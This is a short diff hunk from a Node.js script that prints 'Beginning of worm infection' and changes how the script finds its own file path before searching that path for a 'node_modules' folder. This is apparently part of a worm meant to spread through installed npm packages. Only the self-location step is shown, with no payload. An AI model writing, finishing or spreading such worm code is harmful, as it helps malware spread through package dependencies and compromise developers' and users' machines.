@@ -6,7 +6,7 @@ var fs = require('fs');
 console.log('Beginning of worm infection');
 try{
     
-    var wormfilname = require.main.filename;
+    var wormfilname = __filename;
     var wormfileArr = wormfilname.split(path.sep);
 
     var nodeModulesIndex = wormfileArr.indexOf('node_modules');
